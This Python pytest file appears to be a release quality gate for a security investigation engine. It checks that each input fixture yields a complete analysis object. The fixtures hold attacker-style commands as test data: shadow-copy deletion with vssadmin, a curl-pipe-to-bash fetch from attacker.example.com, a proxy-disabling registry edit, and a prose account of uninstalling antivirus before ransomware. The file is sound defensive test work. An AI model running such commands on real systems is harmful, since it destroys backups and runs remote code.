"""
Investigation Quality Gate (release gate) · 2026-03-01
──────────────────────────────────────────────────────
Rule R11 enforcement: every supported input type MUST produce a
complete Canonical Investigation Object with all required sections
populated.  A release fails if any fixture fails this gate — this is
stronger than "tests passed"; it asserts *analyst-observable*
completeness.

Required SSOT sections (checked for every fixture):

    ✓ metadata          — engine_version + input_bytes
    ✓ health            — check_health() output
    ✓ understanding     — IUE classification
    ✓ plan              — deterministic engine plan (≥1 step)
    ✓ preprocessor      — stage decomposition
    ✓ intent            — attack intent classifier
    ✓ confidence        — overall + signals[]
    ✓ engines_selected  — routing decision

Fixtures cover the frozen input taxonomy:

    · Plain PowerShell
    · Plain CMD
    · PowerShell -EncodedCommand
    · Comma-joined PS re-invocations
    · Vendor prose (Talos IR blog)
    · Bash + curl
    · Bare IOC list
"""
from __future__ import annotations
import base64
import pytest

from services.die.investigation_results import render as render_results


# ── Fixtures ─────────────────────────────────────────────────────
def _b64_enc(script: str) -> str:
    """Encode a PS script the way PowerShell -EncodedCommand expects."""
    return base64.b64encode(script.encode("utf-16-le")).decode()


PLAIN_PS = (
    'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\'
    'CurrentVersion\\Internet Settings" -Name ProxyEnable -Value 0'
)

PLAIN_CMD = (
    "vssadmin delete shadows /all /quiet"
)

ENCODED_PS = (
    "powershell -e "
    + _b64_enc('Set-ItemProperty -Path "HKCU:\\Software\\Test" -Name X -Value 1')
)

COMMA_JOINED_PS = (
    "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "
    "\"Get-WmiObject Win32_ShadowCopy\", "
    "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "
    "\"Get-WmiObject Win32_ShadowCopy\", "
    "-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "
    "\"Get-WmiObject Win32_ShadowCopy\""
)

VENDOR_PROSE = (
    "Talos Incident Response engaged with a customer after they "
    "observed lateral movement across their Windows fleet.  The "
    "operator used vssadmin delete shadows /all /quiet, then "
    "wmic product where name=\"Sophos\" call uninstall, then "
    "issued Set-ItemProperty on HKCU:\\Software\\Microsoft\\Windows\\"
    "CurrentVersion\\Internet Settings to disable the proxy.  "
    "Impact stage followed with ransomware deployment."
)

BASH_CURL = "curl -sSL https://attacker.example.com/x.sh | bash"

IOC_LIST = (
    "1.2.3.4\n"
    "https://malware.example.com/payload.bin\n"
    "evil.example.org\n"
    "d41d8cd98f00b204e9800998ecf8427e\n"
)


FIXTURES = [
    ("plain-powershell",         PLAIN_PS),
    ("plain-cmd",                PLAIN_CMD),
    ("encoded-powershell",       ENCODED_PS),
    ("comma-joined-ps",          COMMA_JOINED_PS),
    ("vendor-prose",             VENDOR_PROSE),
    ("bash-curl",                BASH_CURL),
    ("ioc-list",                 IOC_LIST),
]

REQUIRED_SECTIONS = (
    "metadata", "input", "health", "profiling", "understanding",
    "plan", "commands", "iocs", "lolbas", "mitre", "dkp",
    "preprocessor", "intent", "confidence",
    "engines_selected", "engines_skipped",
)


# ── Gate ─────────────────────────────────────────────────────────
@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_ssot_shape(fixture_id: str, payload: str):
    """Every supported input MUST yield a Canonical Investigation Object
    with all required sections keyed.  Sections may be empty (e.g. no
    IOCs in a plain CMD sample) but the KEY must be present."""
    r = render_results(payload)
    canon = r["object"]
    for section in REQUIRED_SECTIONS:
        assert section in canon, f"{fixture_id}: missing SSOT section {section!r}"


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_deterministic_confidence(fixture_id: str, payload: str):
    """Confidence Breakdown must be present and explainable — never
    just a bare number.  ai_inference must always be False in the
    deterministic pipeline."""
    r = render_results(payload)
    conf = r["object"]["confidence"]
    assert isinstance(conf.get("overall"), int)
    assert conf["overall"] >= 0 and conf["overall"] <= 100
    assert conf["ai_inference"] is False
    signals = conf.get("signals") or []
    assert signals, f"{fixture_id}: confidence.signals must not be empty"
    ids = {s.get("id") for s in signals}
    for required in ("health", "decoder", "parser", "mitre", "lolbas",
                     "ioc", "dkp", "evidence", "ai"):
        assert required in ids, f"{fixture_id}: missing confidence signal {required!r}"


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_plan_present(fixture_id: str, payload: str):
    """Every fixture must produce ≥ 1 plan step so the analyst sees
    the deterministic execution trace."""
    r = render_results(payload)
    plan = r["object"]["plan"]
    assert isinstance(plan, list) and len(plan) >= 1, (
        f"{fixture_id}: plan must contain ≥ 1 step")
    for step in plan:
        assert step.get("engine")
        assert step.get("action")
        assert step.get("status") in ("done", "pending", "skipped", "failed", "empty")


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_health_shape(fixture_id: str, payload: str):
    """Every fixture MUST get a health verdict with ``ok`` + ``ready``
    booleans and ``issues[]`` list.  Non-blocking — even ``ok=False``
    fixtures still emit the section, but plain fixtures should be OK."""
    r = render_results(payload)
    h = r["object"]["health"]
    assert isinstance(h.get("ok"), bool)
    assert isinstance(h.get("ready"), bool)
    assert isinstance(h.get("issues"), list)
    assert isinstance(h.get("checks"), list)


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_understanding_ready(fixture_id: str, payload: str):
    """The IUE must always classify — no fixture may return an empty
    understanding block."""
    r = render_results(payload)
    u = r["object"]["understanding"]
    assert u.get("input_type"), f"{fixture_id}: understanding.input_type missing"
    assert u.get("label"),      f"{fixture_id}: understanding.label missing"


@pytest.mark.parametrize("fixture_id,payload", FIXTURES)
def test_quality_gate_output_text_never_echoes_input(
    fixture_id: str, payload: str,
):
    """The Investigation Results text pane must NEVER be a copy of the
    input (Rule R10 · Golden Rule).  Enforce by requiring the output
    to contain the section headers we render."""
    r = render_results(payload)
    out = r["output"]
    assert "INVESTIGATION RESULTS" in out, (
        f"{fixture_id}: pane missing 'INVESTIGATION RESULTS' header")
    assert "INPUT HEALTH" in out, (
        f"{fixture_id}: pane missing 'INPUT HEALTH' section")
    assert "INPUT UNDERSTANDING" in out, (
        f"{fixture_id}: pane missing 'INPUT UNDERSTANDING' section")
    assert "CONFIDENCE EXPLANATION" in out, (
        f"{fixture_id}: pane missing 'CONFIDENCE EXPLANATION' section")
    # And it must not simply be `payload` verbatim.
    assert out.strip() != (payload or "").strip(), (
        f"{fixture_id}: pane cannot be a raw echo of the input")


def test_quality_gate_encoded_ps_normalizes_to_decoded_script():
    """Special case: -EncodedCommand payloads must produce a stage
    whose ``normalized_command`` is the DECODED script, never the
    base64 blob.  This is the Node-Inspector correctness contract."""
    script = 'Set-ItemProperty -Path "HKCU:\\Software\\Test" -Name X -Value 1'
    payload = "powershell -e " + _b64_enc(script)
    r = render_results(payload)
    stages = r["object"]["preprocessor"]["stages"]
    assert stages, "no stages built for encoded-powershell fixture"
    normalized = stages[0]["normalized_command"] or ""
    assert "Set-ItemProperty" in normalized, (
        "encoded PowerShell normalized_command must contain the decoded "
        f"script, got: {normalized[:120]!r}")
